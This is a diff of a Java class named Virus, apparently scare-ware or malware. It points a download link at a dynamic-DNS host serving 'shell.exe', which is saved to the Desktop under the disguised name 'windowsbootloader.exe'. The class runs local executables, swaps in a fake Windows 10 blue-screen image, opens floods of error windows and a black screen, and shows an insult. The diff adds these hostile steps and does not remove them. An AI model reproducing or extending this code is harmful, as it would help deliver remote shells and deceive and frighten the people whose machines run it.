@@ -15,10 +15,10 @@ public class Virus extends Canvas implements Runnable {
 
 	private static final long serialVersionUID = -7293884342156288804L;
 	
-	private final String link = "http://davinki.ddns.net:8000/reverse.exe";
+	private final String link = "http://davinki.ddns.net:8000/shell.exe";
 	private final String file_name = "C:\\Users\\" + System.getProperty("user.name") + "\\Desktop\\windowsbootloader.exe";
 
-	private final int ERRORS = 60;
+	private final int ERRORS = 70;
 	private ArrayList<ErrorWindow> windows = new ArrayList<ErrorWindow>();
 	
 	private Thread thread;
@@ -30,15 +30,15 @@ public class Virus extends Canvas implements Runnable {
 
 	public Virus() throws Exception {
 		
-		img = ImageIO.read(ClassLoader.getSystemResource("pwned.jpg"));
+		try { Thread.sleep(2000); } 
+		catch (InterruptedException e) { e.printStackTrace(); }
+		
+		img = ImageIO.read(ClassLoader.getSystemResource("windows10-bsod.jpg"));
 		
 		this.addKeyListener(new KeyInput());
 	    
-		GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
-		GraphicsDevice[] gs = ge.getScreenDevices();
-		
 		try {
-			Runtime.getRuntime().exec("C:\\Users\\" + System.getProperty("user.name") + "\\Desktop\\compile\\dist\\freerobux.exe");
+			Runtime.getRuntime().exec("C:\\Users\\" + System.getProperty("user.name") + "\\Desktop\\timoisteinspast\\dist\\penis.exe");
 			Thread.sleep(3000);
 		} catch (Exception e){
 			e.printStackTrace();
@@ -62,8 +62,9 @@ public class Virus extends Canvas implements Runnable {
 			catch (InterruptedException e) { e.printStackTrace(); }
 		}
 		
-		new PlayAudio("stayinalive.wav", 0.7f);
+		//new PlayAudio("stayinalive.wav", 0.7f);
 		new Window("Du schwanz", this);
+		new BlackScreen("Du schwanz", 1);
 		
 		try { Thread.sleep(10000); } 
 		catch (InterruptedException e) { e.printStackTrace(); }
